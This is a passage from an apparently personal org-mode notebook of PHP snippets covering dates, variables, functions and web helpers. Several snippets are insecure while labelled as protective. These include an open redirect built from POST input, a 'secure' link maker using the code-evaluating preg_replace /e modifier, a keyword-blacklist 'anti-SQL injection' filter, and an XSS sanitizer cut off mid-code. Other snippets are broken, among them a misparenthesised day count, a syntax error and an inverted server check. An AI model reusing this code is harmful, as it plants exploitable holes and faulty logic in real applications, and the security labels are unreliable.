and 45 seconds elapsed between them.

Note that the difference isn’t divided into larger chunks than weeks
(i.e., months or years) because those chunks have variable length and
wouldn’t give an accurate count of the time difference calculated.

** date difference using ~DateInterval~

#+begin_src php
<?php
$datetime1 = new DateTime('2009-10-11');
$datetime2 = new DateTime('2009-10-13');
$interval = $datetime1->diff($datetime2);
echo $interval->format('%R%a days');
?>
#+end_src
 
Procedural style
#+begin_src php
<?php
$datetime1 = date_create('2009-10-11');
$datetime2 = date_create('2009-10-13');
$interval = date_diff($datetime1, $datetime2);
echo $interval->format('%R%a days');
?>
#+end_src
 
The above examples will output:

+2 days

** number of days between two dates
#+begin_src php
$today->diff($yesterday)->days;

date_diff($today, $yesterday)->days;

// using epoch timestamp
// 86400 is number of seoconds in day
$today->getTimestamp() - $yesterday->getTimestamp()/86400;
#+end_src

** convert seconds to time with format HH:MM:SS
#+begin_src php
date('H:i:s', $seconds);
#+end_src

** current minute, second

#+begin_src php 
$currentMinute = ltrim(date('i'),'0');
$currentSecond = date('s')+0;
#+end_src

** Convert minutes to hours #1
#+begin_src php
<?PHP
 
// convert minutes to hours:minutes
$act_elapsedHoursMins = SPRINTF("%d:%02d", ABS((int)($act_elapsed_mins/60)), ABS((int)($act_elapsed_mins%60)));
 
$sch_elapsedHoursMins = SPRINTF("%d:%02d", ABS((int)($sch_elapsed_mins/60)), ABS((int)($sch_elapsed_mins%60)));
 
?>
#+end_src

** Convert minutes to hours #2
#+begin_src php
 <?PHP
$hours = SPRINTF(”%d:%02d”, ABS((int)$min/60), ABS((int)$min%60));
 
//convert to "1.25" hours
$elapsedTime = SPRINTF("%01.1f", $elapsed_mins/60);
 
?> 
#+end_src

** Creating a PHP date in the format for a SQL Timestamp insert
*** example #1
you can get the current date and time in the proper format using just PHP, like this:

#+begin_src php
$timestamp = date('Y-m-d G:i:s');
//If you print this out, your $timestamp field will now contain contents like this:
//2011-08-06 14:54:17
#+end_src

*** Getting a timestamp for some other date and time
   
Note that the PHP date function defaults to the current date and time. This is
exactly what I need for my purposes here. If you need to create a formatted
timestamp field for some other date and time, you can do that something like
this:

#+begin_src php
$timestamp = date('Y-m-d G:i:s', mktime(0, 0, 0, 7, 1, 2000));
//Here are some other mktime examples:
$tomorrow  = mktime(0, 0, 0, date("m")  , date("d")+1, date("Y"));
$lastmonth = mktime(0, 0, 0, date("m")-1, date("d"),   date("Y"));
$nextyear  = mktime(0, 0, 0, date("m"),   date("d"),   date("Y")+1);
#+end_src

** PHP string to date 

The following PHP code shows the two steps I used to convert a date string into
a PHP date structure I could work with:
#+begin_src php 
<?php

// (1) returns a Unix timestamp, like 1304496000
$time = strtotime("2011/05/21");

// (2) getDate() returns an associative array containing the date 
// information of the timestamp, or the current local time if 
// no timestamp is given
$date = getDate($time);

print_r($date);

?>
When printed, the $date data structure (a hash) looks like this:

Array
(
  [seconds] => 0
  [minutes] => 0
  [hours] => 0
  [mday] => 21
  [wday] => 6
  [mon] => 5
  [year] => 2011
  [yday] => 140
  [weekday] => Saturday
  [month] => May
  [0] => 1305964800
)
#+end_src

** next month
#+begin_src php
$next_month = getDate(mktime(1, 1, 1, $date['mon'] + 1, $date["mday"], $date["year"];));
#+end_src 

** next day
#+begin_src php
function nextDay(DateTime $date)
{
  $next_day = clone $date;
  return $next_day->modify('+1 day');
}
#+end_src 

** PHP date validation
the basic PHP date validation technique is to use the checkdate function, like this:

#+begin_src php
$valid = checkdate($month, $day, $year);

#+end_src

The PHP checkdate function returns true if:
$month is between 1 and 12,
$year is between 1 and 32767, and
$day is between 1 and the correct maximum number of days for the given month and year (correctly handling leap years).

Used in a PHP if/then statement, the PHP checkdate function call looks like this:

#+begin_src php
if (checkdate($month, $day, $year)) {
  // do something
}
#+end_src 

** Working with dates and times (/bestpractice/)
*Use the DateTime class.*

In the bad old days of PHP we had to work with dates and times using a
bewildering combination of date(), gmdate(), date_timezone_set(), strtotime(),
and so on. Sadly you’ll still find lots of tutorials online featuring these
difficult and old-fashioned functions.

Fortunately for us, the version of PHP we’re talking about features the much
friendlier DateTime class. This class encapsulates all the functionality and
more of the old date functions in one easy-to-use class, with the bonus of
making time zone conversions much simpler. Always use the DateTime class for
creating, comparing, changing, and displaying dates in PHP.

#+begin_src php 
<?php
// Construct a new UTC date.  Always specify UTC unless you really know what you're doing!
$date = new DateTime('2011-05-04 05:00:00', new DateTimeZone('UTC'));
 
// Add ten days to our initial date
$date->add(new DateInterval('P10D'));
 
echo($date->format('Y-m-d h:i:s')); // 2011-05-14 05:00:00
 
// Sadly we don't have a Middle Earth timezone
// Convert our UTC date to the PST (or PDT, depending) time zone
$date->setTimezone(new DateTimeZone('America/Los_Angeles'));
 
// Note that if you run this line yourself, it might differ by an hour depending on daylight savings
echo($date->format('Y-m-d h:i:s')); // 2011-05-13 10:00:00
 
$later = new DateTime('2012-05-20', new DateTimeZone('UTC'));
 
// Compare two dates
if($date < $later)
    echo('Yup, you can compare dates using these easy operators!');
 
// Find the difference between two dates
$difference = $date->diff($later);
 
echo('The 2nd date is ' . $difference->days . ' later than 1st date.');
?>
#+end_src

 - If you don’t specify a time zone, DateTime::__construct() will set the
   resulting date’s time zone to the time zone of the computer you’re running
   on. This can lead to spectacular headaches later on. Always specify the UTC
   time zone when creating new dates unless you really know what you’re doing.

 - If you use a Unix timestamp in DateTime::__construct(), the time zone will
   always be set to UTC regardless of what you specify in the second argument.

 - Passing zeroed dates (e.g. “0000-00-00”, a value commonly produced by MySQL
   as the default value in a DateTime column) to DateTime::__construct() will
   result in a nonsensical date, not “0000-00-00”.

 - Using DateTime::getTimestamp() on 32-bit systems will not represent dates past 2038. 64-bit systems are OK.

** Count days between dates
#+begin_src php
<?PHP
 
// First Date: 1 January 2005
// Second Date: 27 January 2005
 
$first_date = MKTIME(12,0,0,1,1,2005);
$second_date = MKTIME(12,0,0,1,27,2005);
 
$offset = $second_date-$first_date;
 
ECHO FLOOR($offset/60/60/24) . " days";
 
// This will display: 26 days. 
 
?>
#+end_src

** Convert 12 to 24 hour time and vice versa
#+begin_src php
<?PHP
 
// 24-hour time to 12-hour time 
$time_in_12_hour_format  = DATE("g:i a", STRTOTIME("13:30"));
 
// 12-hour time to 24-hour time 
$time_in_24_hour_format  = DATE("H:i", STRTOTIME("1:30 pm"));
 
?>
#+end_src

** UNIX Timestamp conversion
#+begin_src php
<?PHP
// produces a timestamp that looks like "YYYY-MM-DD 24:00:00":
$formated_datetime = DATE("Y-m-d H:i:s");
 
// takes $formated_datetime and converts to "UNIX timestamp":
$unix_timestamp = STRTOTIME($formated_datetime);
 
// converts $unix_timestamp to "normal" formated_datetime:         
$formated_datetime = DATE("Y-m-d H:i:s",$unix_timestamp);   
?>
#+end_src

** What Season Is It?
#+begin_src php
<?PHP 
 
FUNCTION season() {
   $limits=ARRAY('/12/21'=>'Winter','/09/21'=>'Autumn','/06/21'=>'Summer','/03/21'=>'Spring','/12/31'=>'Winter');
   FOREACH ($limits AS $key => $value) {
       $limit=DATE("Y").$key;
       IF (STRTOTIME("now")>strtotime($limit)) {
           RETURN $value;
       }
   }
}
 
ECHO season();
 
?>
#+end_src

** Days in month #1
#+begin_src php
<?PHP
 
//return the number of days for this month and this year
$ndays = DATE("t"); 
 
// You can also specify a date
$ndays = DATE("t", MKTIME(0, 0, 0, 12, 1, 2004)); 
 
?> 
#+end_src

** Days in month #2
#+begin_src php
<?PHP
 
/*
days_in_month($month, $year)
Returns the number of days in a given month and 
year, taking into account leap years.
 
$month: numeric month (integers 1-12)
$year: numeric year (any integer)
 
*/
 
FUNCTION days_in_month($month, $year){
// calculate number of days in a month
RETURN $month == 2 ? ($year % 4 ? 28 : ($year % 100 ? 29 : ($year % 400 ? 28 : 29))) : (($month - 1) % 7 % 2 ? 30 : 31);
}
?> 
#+end_src

** How many days ago
#+begin_src php
<?PHP
 
// convert a date into a string that tells how long 
// ago that date was.... eg: 2 days ago, 3 minutes ago.
FUNCTION ago($d) {
     $c = GETDATE();
     $p = ARRAY('year', 'mon', 'mday', 'hours', 'minutes', 'seconds');
     $display = ARRAY('year', 'month', 'day', 'hour', 'minute', 'second');
     $factor = ARRAY(0, 12, 30, 24, 60, 60);
     $d = datetoarr($d);
     FOR ($w = 0; $w < 6; $w++) {
          IF ($w > 0) {
               $c[$p[$w]] += $c[$p[$w-1]] * $factor[$w];
               $d[$p[$w]] += $d[$p[$w-1]] * $factor[$w];
          }
          IF ($c[$p[$w]] - $d[$p[$w]] > 1) { 
               RETURN ($c[$p[$w]] - $d[$p[$w]]).' '.$display[$w].'s ago';
          }
     }
     RETURN '';
}
 
// you can replace this if need be. This converts the dates 
// returned from a mysql date string into an array object similar 
// to that returned by getdate().
FUNCTION datetoarr($d) {
     PREG_MATCH("/([0-9]{4})(\\-)([0-9]{2})(\\-)([0-9]{2}) ([0-9]{2})(\\:)([0-9]{2})(\\:)([0-9]{2})/", $d, $matches);
    RETURN ARRAY( 
          'seconds' => $matches[10], 
          'minutes' => $matches[8], 
          'hours' => $matches[6],  
          'mday' => $matches[5], 
          'mon' => $matches[3],  
          'year' => $matches[1], 
     );
}
 
?>
#+end_src

** Find days between dates #1
#+begin_src php
<?PHP
 
$dt=ARRAY("27.01.1985","12.09.2008");
$dates=ARRAY();
$i=0;
WHILE(STRTOTIME($dt[1])>=STRTOTIME("+".$i." day",STRTOTIME($dt[0])))
$dates[]=DATE("Y-m-d",STRTOTIME("+".$i++." day",STRTOTIME($dt[0])));
 
FOREACH($dates AS $value) ECHO $value."<br />"; 
 
?>
#+end_src

*** variables
** Establishing a Default Value
Use isset() to assign a default to a variable that may already have a value:
#+begin_src php
if (! isset($cars)) { $cars = $default_cars; }
#+end_src 

Use the ternary (a ? b : c) operator to give a new variable a (possibly default) value:
#+begin_src php
$cars = isset($_REQUEST['cars']) ? $_REQUEST['cars'] : $default_cars;
#+end_src 

Using isset() is essential when assigning default values. Without it,
the nondefault value can’t be 0 or anything else that evaluates to
false. Consider this assignment:

#+begin_src php
$cars = $_REQUEST['cars'] ? $_REQUEST['cars'] : $default_cars;
#+end_src 

If $_REQUEST['cars'] is 0, $cars is set to $default_cars even though 0
may be a valid value for $cars.

An alternative syntax for checking arrays is the array_key_exists() function:
#+begin_src php
$cars = array_key_exists('cars', $_REQUEST) ? $_REQUEST['cars'] : $default_cars;
#+end_src 
The one difference between isset() and array_key_exists() is that when
a key exists but its value is null, then array_key_exists() returns
true, while isset() returns false:
#+begin_src php
$vehicles = array('cars' => null);
array_key_exists('cars', $vehicles); // true
isset($vehicles['cars']);            // false
#+end_src 

** Exchanging Values Without Using Temporary Variables
To swap $a and $b:
#+begin_src php
list($a,$b) = array($b,$a);
#+end_src 

** Creating a Dynamic Variable Name
You want to construct a variable’s name dynamically. For example, you
want to use variable names that match the field names from a database
query.

Use PHP’s variable variable syntax by prepending a $ to a variable
whose value is the variable name you want:
#+begin_src php
$animal = 'turtles';
$turtles = 103;
print $$animal;    // 103
#+end_src

Using curly braces , you can construct more complicated expressions that indicate variable names:

$stooges = array('Moe','Larry','Curly');
$stooge_moe = 'Moses Horwitz';
$stooge_larry = 'Louis Feinberg';
$stooge_curly = 'Jerome Horwitz';

foreach ($stooges as $s) {
  print "$s's real name was ${'stooge_'.strtolower($s)}.\n";
}
Moe's real name was Moses Horwitz.
Larry's real name was Louis Feinberg.
Curly's real name was Jerome Horwitz.

PHP evaluates the expression between the curly braces and uses it as a
variable name. That expression can even have function calls in it,
such as strtolower().

Variable variables are also useful when iterating through similarly
named variables. Say you are querying a database table that has fields
named title_1, title_2, etc. If you want to check if a title matches
any of those values, the easiest way is to loop through them like
this:

for ($i = 1; $i <= $n; $i++) {
    $t = "title_$i";
    if ($title == $$t) { /* match */ }
}

Of course, it would be more straightforward to store these values in
an array, but if you are maintaining old code that uses this technique
(and you can’t change it), variable variables are helpful.

The curly brace syntax is also necessary in resolving ambiguity about
array elements. The variable variable $$donkeys[12] could have two
meanings. The first is “take what’s in the 12th element of the
$donkeys array and use that as a variable name.” Write this as:
${$donkeys[12]}. The second is “use what’s in the scalar $donkeys as
an array name and look in the 12th element of that array.” Write this
as: ${$donkeys}[12].

You are not limited by two dollar signs. You can use three, or more,
but in practice it’s rare to see greater than two levels of
indirection.

** Using Static Variables
Declare the variable as static:
#+begin_src php
function track_times_called() {
    static $i = 0;
    $i++;
    return $i;
}
#+end_src
 
** Encapsulating Complex Data Types in a String

You want a string representation of an array or object for storage in
a file or database. This string should be easily reconstitutable into
the original array or object.  Solution

Use serialize() to encode variables and their values into a textual form:

#+begin_src php
$pantry = array('sugar' => '2 lbs.','butter' => '3 sticks');
$fp = fopen('/tmp/pantry','w') or die ("Can't open pantry");
fputs($fp,serialize($pantry));
fclose($fp);
#+end_src 

To recreate the variables, use unserialize():

#+begin_src php
$new_pantry = unserialize(file_get_contents('/tmp/pantry'));
#+end_src 

** Checking if a value is null or false (/best practice/)
*Use the === operator to check for null and boolean false values.*

PHP’s loose typing system offers many different ways of checking a variable’s
value. However it also presents a lot of problems. Using == to check if a value
is null or false can return false positives if the value is actually an empty
string or 0. isset() checks whether a variable has a value that is not null, but
doesn’t check against boolean false.

The is_null() function accurately checks if a value is null, and the is_bool()
function checks if it’s a boolean value (like false), but there’s an even better
option: the === operator. === checks if the values are identical, which is not
the same as equivalent in PHP’s loosely-typed world. It’s also slightly faster
than is_null() and is_bool(), and looks nicer than using a function for
comparison.
#+begin_src php
<?php
$x = 0;
$y = null;
 
// Is $x null?
if($x == null)
    print('Oops! $x is 0, not null!');
 
// Is $y null?
if(is_null($y))
    print('Great, but could be faster.');
 
if($y === null)
    print('Perfect!');
 
// Does the string abc contain the character a?
if(strpos('abc', 'a'))
    // GOTCHA!  strpos returns 0, indicating it wishes to return the position of the first character.
    // But PHP interpretes 0 as false, so we never reach this print statement!
    print('Found it!');
 
//Solution: use !== (the opposite of ===) to see if strpos() returns 0, or boolean false.
if(strpos('abc', 'a') !== false)
    print('Found it for real this time!');
?>
#+end_src

 - When testing the return value of a function that can return either 0 or boolean false, like strpos(), always use === and !==, or you’ll run in to problems.

** Escape characters in the PHP date function
*Escape characters in date with \*

As an example, there are some date formats that require a string constant T
between the date and time parts of the timestamp, but not the timezone offset as
well (the 'c' format character will do the T but also include the offset at the
end).

This is what I'd been doing in the past:
#+begin_src php
// don't do this yourself, use the second example below
$datetime = date('Y-m-d') . 'T' . date('H:i:s');
#+end_src 

By escaping the T with a \ you can do it with one call to the date function,
which is much more sensible and I don't know why I never checked the online
documentation in the past to see if it could be done more concisely:
#+begin_src php 
$datetime = date('Y-m-d\TH:i:s');
#+end_src

** seconds to string
#+begin_src php
function secs_to_str($d)
{
    $periods = array( 'day'    => 86400,
                      'hour'   => 3600,
                      'minute' => 60,
                      'second' => 1 );
    $parts = array();
    foreach ( $periods as $name => $dur )
    {
        $div = floor( $d / $dur );
         if ( $div == 0 )
                continue;
         else if ( $div == 1 )
                $parts[] = $div . " " . $name;
         else
                $parts[] = $div . " " . $name . "s";
         $d %= $dur;
    }
    $last = array_pop( $parts );
    if ( empty( $parts ) )
        return $last;
    else
        return join( ', ', $parts ) . " and " . $last;
}
#+end_src

Example usage for this function would be as follows
#+begin_src php
$start_time = time();

// put your code here
sleep(rand(1,10)); // to give us some test data

$stop_time = time();
$seconds_taken = $stop_time - $start_time;

print( secs_to_str( $seconds_taken ) );
#+end_src

example output for this function
#+begin_src 
9 seconds
2 hours, 8 minutes and 55 seconds
1 day, 10 hours, 30 minutes and 19 seconds
#+end_src 

* functions
** checking for a function's existence

#+begin_src php
<?php
if (function_exists("array_combine"))
{
    echo "Function exists";
}
else
{
    echo "Function does not exist - better write our own";
}
?>
#+end_src

** Creating Functions That Take a Variable Number of Arguments 
use =func_num_args()= and =func_get_arg()= functions.

#+begin_src php
// find the "average" of a group of numbers
function mean() {
    // initialize to avoid warnings
    $sum = 0;

    // the number of arguments passed to the function
    $size = func_num_args();

    // iterate through the arguments and add up the numbers
    for ($i = 0; $i < $size; $i++) {
        $sum += func_get_arg($i);
    }

    // divide by the amount of numbers
    $average = $sum / $size;

    // return average
    return $average;
}

$mean = mean(96, 93, 97); 
#+end_src

There is a third version of this function that uses func_num_args( ) to return
an array containing all the values passed to the function.

#+begin_src php
// find the "average" of a group of numbers
function mean() {
    // initialize to avoid warnings
    $sum = 0;

    // load the arguments into $numbers
    $numbers = func_get_args();

    // the number of elements in the array
    $size = count($numbers);

    // iterate through the array and add up the numbers
    for ($i = 0; $i < $size; $i++) {
        $sum += $numbers[$i];
    }

    // divide by the amount of numbers
    $average = $sum / $size;

    // return average
    return $average;
}

$mean = mean(96, 93, 97);
#+end_src

** returning anonymous functions
#+begin_src php
<?php
function setData($user, $pass, $host){
  return function() use ($user, $pass, $host){
    return array($user, $pass, $host);
  };
}

//set the data once
$container = setData('test', 'password', 'localhost');
//use the function without passing the data again (and it should be noted, you
//can't set the data again)
var_dump($container());
And the output:

array(3) {
  [0]=>
  string(4) "test"
  [1]=>
  string(8) "password"
  [2]=>
  string(9) "localhost"
}
#+end_src

** creating dynamic functions
Use the closure syntax to define a function and store it in a variable:

#+begin_src php 
$increment = 7;
$add = function($i, $j) use ($increment) { return $i + $j + $increment; };
$sum = $add(1, 2);
#+end_src 

$sum is now 10. If you are using a version of PHP earlier than 5.3.0, use create_function()
instead:

#+begin_src php
$increment = 7;
$add = create_function('$i,$j', 'return $i+$j + ' . $increment. ';');
$sum = $add(1, 2);
#+end_src 

A frequent use for anonymous functions is to create custom sorting functions for
usort() or array_walk() :
#+begin_src php 
$files = array('ziggy.txt', '10steps.doc', '11pants.org', "frank.mov");
// sort files in reverse natural order
usort($files, function($a, $b) { return strnatcmp($b, $a); });
// Now $files is
// array('ziggy.txt', 'frank.mov','11pants.org','10steps.doc')
#+end_src 

** Using Named Parameters
*Problem*
You want to specify your arguments to a function by name, instead of simply their
position in the function invocation.

*Solution*
PHP doesn’t have language-level named parameter support like some other languages
do. However, you can emulate it by having a function use one parameter and making
that parameter an associative array:
#+begin_src php 
function image($img) {
  $tag = '<img src="' . $img['src'] . '" ';
  $tag .= 'alt="' . (isset($img['alt']) ? $img['alt'] : '') .'"/>';
  return $tag;
}
// $image1 is '<img src="cow.png" alt="cows say moo"/>'
$image1 = image(array('src' => 'cow.png', 'alt' => 'cows say moo'));
// $image2 is '<img src="pig.jpeg" alt=""/>'
$image2 = image(array('src' => 'pig.jpeg'));
#+end_src 

** Returning Values by Reference
*Problem*
You want to return a value by reference, not by value. This allows you to avoid making
a duplicate copy of a variable.

*Solution*
The syntax for returning a variable by reference is similar to passing it by reference.
However, instead of placing an & before the parameter, place it before the name of the
function:
#+begin_src php 
function &array_find_value($needle, &$haystack) {
  foreach ($haystack as $key => $value) {
    if ($needle == $value) {
      return $haystack[$key];
    }
  }
}
#+end_src 

Also, you must use the =& assignment operator instead of plain = when invoking the
function:
#+begin_src php 
$band =& array_find_value('The Doors', $artists);
#+end_src 

* Misc
** get results from eval
use  ~return~ eg:

#+begin_src php
$res = eval('return 2 + 3;');      // 5
#+end_src

** redirecting
   
When redirecting to some scripts, the redirection also passes on the
entire QUERY_STRING the query string is stored in the PHP
environment variable $QUERY_STRING as a GET method parameter. In
addition, a session variable, referer, is registered in selected cases
so that in later processing the script can redirect to the original
calling page.

#+begin_src php
<?php
if ($_POST[location] == "") {
   header("Location: http://127.0.0.1/redirect_form.html");
   exit;
} else {
   header("Location: $_POST[location]");
   exit;
}
?>
#+end_src

** making the root path

#+begin_src php
define("ROOT",realpath(dirname(__FILE__)));
#+end_src

** HTTP refresh with echo

#+begin_src php 
echo "<meta http-equiv='refresh' content='0;url=http://domain.com?a=1&b=2'>";
//or even
header ("Location: url=http://domain.com?a=1&b=2");
#+end_src 

** user IP

#+begin_src php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
  $ip=$_SERVER['HTTP_CLIENT_IP'];}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
  $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];} 
else {
  $ip=$_SERVER['REMOTE_ADDR'];
}
#+end_src

a more advanced version 

#+begin_src php 
function get_ip_address(){
    //taken from
    // http://stackoverflow.com/questions/1634782/what-is-the-most-accurate-way-to-retrieve-a-users-correct-ip-address-in-php
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $ip){
                $ip = trim($ip); // just to be safe

                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false){
                    return $ip;
                }
            }
        }
    }
}
#+end_src 

** block ip address
   
#+begin_src php
<?php
 
$denyIP = array("IP Address 1", "IP Address 2", "IP Address 3");
 
IF (in_array ($_SERVER['REMOTE_ADDR'], $denyIP)) {
    header(”location: http://www.microsoft.com/”);
    EXIT();
} 
 
?>
#+end_src

** check server status 

#+begin_src php

<?php
 
// Domain name to check
$domainName = "http://www.farahoosh.ir" ;
 
function DomainCheck($domain_name){
    $start_time = microtime(TRUE);
    $openDomain = fsockopen ($domain_name, 80, $errno, $errstr, 10);
    $end_time  = microtime(TRUE);
    $server_status    = 0;
 
    if (!$openDomain){
        $server_status = -1;  
    }else{
        fclose($openDomain);
        $status = ($end_time - $start_time) * 1000;
        $server_status = floor($server_status);
    }
    return $server_status;
}
 
$server_status = DomainCheck($domain_name);
 
 
if ($server_status != -1) {
  print "Cannot reach the server." ;
}else{
  print "Server is responding properly." ;
}
?>

#+end_src

** check if a domain exists

#+begin_src php
<?PHP
 
FUNCTION url_exists($strURL) {
    $resURL = curl_init();
    curl_setopt($resURL, CURLOPT_URL, $strURL);
    curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1);
    curl_setopt($resURL, CURLOPT_HEADERFUNCTION, 'curlHeaderCallback');
    curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
 
    curl_exec ($resURL);
 
    $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE);
    curl_close ($resURL);
 
    IF ($intReturnCode != 200 && $intReturnCode != 302 && $intReturnCode != 304) {
       RETURN FALSE;
    } ELSE {
        RETURN TRUE;
    }
}
 
//OR.................
 
FUNCTION is_valid_url($url)
{
    $url = PREG_REPLACE('~^https?://~i', NULL, $url);
    RETURN @CHECKDNSRR($url);
}
 
?>
#+end_src

** Check syntax of multiple PHP files all at once

#+begin_src shell
find ./ -type f -name \*.php -EXEC php -l {} \;
#+end_src 

** XSS Sanitizer Function

#+begin_src php
<?PHP
 
/* CLEANS AGAINST XSS
 * 
 * NOTE all credits goes to codeigniter.com
 * @param string $str - string to check
 * @param string $charset - character set (default ISO-8859-1)
 * @return string|bool $value sanitized string
 */
 
FUNCTION ft_xss($str, $charset = 'ISO-8859-1') {
    /*
    * Remove Null Characters
    *
    * This prevents sandwiching null characters
    * between ASCII characters, like Java\0script.
    *
    */
    $str = PREG_REPLACE('/\0+/', '', $str);
    $str = PREG_REPLACE('/(\\\\0)+/', '', $str);
 
    /*
    * Validate standard character entities
    *
    * Add a semicolon if missing.  We do this to enable
    * the conversion of entities to ASCII later.
    *
    */
    $str = PREG_REPLACE('#(&\#*\w+)[\x00-\x20]+;#u',"\\1;",$str);
 
    /*
    * Validate UTF16 two byte encoding (x00)
    *
    * Just as above, adds a semicolon if missing.
    *
    */
    $str = PREG_REPLACE('#(&\#x*)([0-9A-F]+);*#iu',"\\1\\2;",$str);
 
    /*
    * URL Decode
    *
    * Just in case stuff like this is submitted:
    *
    * <a href="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">Google</a>
    *
    * Note: Normally urldecode() would be easier but it removes plus signs
    *
    */     
    $str = PREG_REPLACE("/%u0([a-z0-9]{3})/i", "
#+end_src
    
** Anti-SQL Injection Function

#+begin_src php
<?PHP
    FUNCTION anti_injection( $user, $pass ) {
           // We'll first get rid of any special characters using a simple regex statement.
           // After that, we'll get rid of any SQL command words using a string replacment.
            $banlist = ARRAY (
                    "insert", "select", "update", "delete", "distinct", "having", "truncate", "replace",
                    "handler", "like", " as ", "or ", "procedure", "limit", "order by", "group by", "asc", "desc"
            );
            // ---------------------------------------------
            IF ( EREGI ( "[a-zA-Z0-9]+", $user ) ) {
                    $user = TRIM ( STR_REPLACE ( $banlist, '', STRTOLOWER ( $user ) ) );
            } ELSE {
                    $user = NULL;
            }
            // ---------------------------------------------
            // Now to make sure the given password is an alphanumerical string
            // devoid of any special characters. strtolower() is being used
            // because unfortunately, str_ireplace() only works with PHP5.
            IF ( EREGI ( "[a-zA-Z0-9]+", $pass ) ) {
                    $pass = TRIM ( STR_REPLACE ( $banlist, '', STRTOLOWER ( $pass ) ) );
            } ELSE {
                    $pass = NULL;
            }
            // ---------------------------------------------
            // Now to make an array so we can dump these variables into the SQL query.
            // If either user or pass is NULL (because of inclusion of illegal characters),
            // the whole script will stop dead in its tracks.
            $array = ARRAY ( 'user' => $user, 'pass' => $pass );
            // ---------------------------------------------
            IF ( IN_ARRAY ( NULL, $array ) ) {
                    DIE ( 'Invalid use of login and/or password. Please use a normal method.' );
            } ELSE {
                    RETURN $array;
            }
    }
?>
#+end_src

** Anti-flood protection
#+begin_src php
<?PHP
 
IF (!ISSET($_SESSION)) {
    SESSION_START();
}
// anti flood protection
IF($_SESSION['last_session_request'] > TIME() - 2){
    // users will be redirected to this page if it makes requests faster than 2 seconds
    HEADER("location: /flood.html");
    EXIT;
}
$_SESSION['last_session_request'] = TIME();
 
?>
#+end_src

** Auto Link Maker
#+begin_src php
<?PHP
 
FUNCTION change_string($str){
     $str = TRIM($str);
     $str = HTMLSPECIALCHARS($str);
     $str = PREG_REPLACE('#(.*)\@(.*)\.(.*)#','<a href="mailto:\\1@\\2.\\3">Send email</a>',$str);
     $str = PREG_REPLACE('=([^\s]*)(www.)([^\s]*)=','<a href="http://\\2\\3" target=\'_new\'>\\2\\3</a>',$str);
     RETURN $str;
   }
 
?>
#+end_src

** Secure Auto-Link Maker
#+begin_src php
<?PHP
 
FUNCTION convert_links($str) {
       $replace = <<<EOPHP
'<a href="'.htmlentities('\\1').htmlentities('\\2').//remove line break
'">'.htmlentities('\\1').htmlentities('\\2').'</a>'
EOPHP;
   $str = PREG_REPLACE('#(http://)([^\s]*)#e', $replace, $str);
   RETURN $str;
}
 
?>
#+end_src

** Ban Proxy Servers

#+begin_src php
<?PHP
 
IF(ISSET($_SERVER['HTTP_X_FORWARDED_FOR']) || ($_SERVER['HTTP_USER_AGENT']=='') || ($_SERVER['HTTP_VIA']!='')){
        DIE("Proxy servers not allowed.");
}
 
$proxy_headers = ARRAY(   
     'HTTP_VIA',   
     'HTTP_X_FORWARDED_FOR',   
     'HTTP_FORWARDED_FOR',   
     'HTTP_X_FORWARDED',   
     'HTTP_FORWARDED',   
     'HTTP_CLIENT_IP',   
     'HTTP_FORWARDED_FOR_IP',   
     'VIA',   
     'X_FORWARDED_FOR',   
     'FORWARDED_FOR',   
     'X_FORWARDED',   
     'FORWARDED',   
     'CLIENT_IP',   
     'FORWARDED_FOR_IP',   
     'HTTP_PROXY_CONNECTION'   
        );
FOREACH($proxy_headers AS $x){
     IF (ISSET($_SERVER[$x])) DIE("You are using a proxy.");
        EXIT;
}
 
?> 
#+end_src

** Buffered Download code
   
#+begin_src php
 <?php
 
//start buffered download
    WHILE(!feof($fp)){
 
        $total     = filesize($file);
        $sent      = 0;
        $blocksize = (2 << 20); //2M chunks
        $handle    = fopen($file, "r");
 
        // Now we need to loop through the file 
        // AND echo out chunks of file data
        WHILE($sent < $total){
            echo fread($handle, $blocksize);
            $sent += $blocksize;
        }
 
        EXIT(0);
        @flush();
        @ob_flush();
    }
 
?>  
#+end_src

** Build Date Select Boxes
#+begin_src php
<?PHP
 
FUNCTION buildDate($name, $m, $d, $y) {
        $date = DATE("m-d-Y",STRTOTIME("now"));
        $date_array = EXPLODE("-",$date);
        $now_m = "";
        $now_d = "";
        $now_y = "";
        $month = '<select class="small" name="'.$name.'_month">';
        $month .= '<option value="" selected disabled>mm</option>';
        FOR ($i=1;$i<=12;$i++) {
                IF ( $m != "" ) {
                        IF ( $m == $i ) {
                                $now_m = "selected";
                        }
                }ELSEIF ( $m == "0" ) {
                        $now_m = "";
                }ELSE{
                        IF ( $date_array[0] == $i ) {
                                $now_m = "selected";
                        }
                }
                $month .= '<option value="'.$i.'" '.$now_m.'>'.$i.'</option>';
                $now_m = "";
        }//END month for loop
        $month .= '</select>';
        $day = '<select class="small" name="'.$name.'_day">';
        $day .= '<option value="" selected disabled>dd</option>';
        FOR ($i=1;$i<=31;$i++) {
                IF ( $d != "" ) {
                        IF ( $d == $i ) {
                                $now_d = "selected";
                        }
                }ELSEIF ( $d == "0" ) {
                        $now_d = "";
                }ELSEIF ( $d == $i ) {
                        $now_d = "selected";
                }ELSE{
                        IF ( $date_array[1] == $i ) {
                                $now_d = "selected";
                        }
                }
                $day .= '<option value="'.$i.'" '.$now_d.'>'.$i.'</option>';
                $now_d = "";
        }//END day for loop
        $day .= '</select>';
        $year = '<select class="small" name="'.$name.'_year">';
        $year .= '<option value="" selected disabled>yyyy</option>';
        FOR ($i=GMDATE("Y"); $i <=SUBSTR(get330Date(),0,4); $i++) {
                IF ( $y != "" ) {
                        IF ( $y == $i ) {
                                $now_y = "selected";
                        }
                }ELSEIF ( $y == "0" ) {
                        $now_y = "";
                }ELSEIF ( $y == $i ) {
                        $now_y = "selected";
                }ELSE{
                        IF ( $date_array[2] == $i ) {
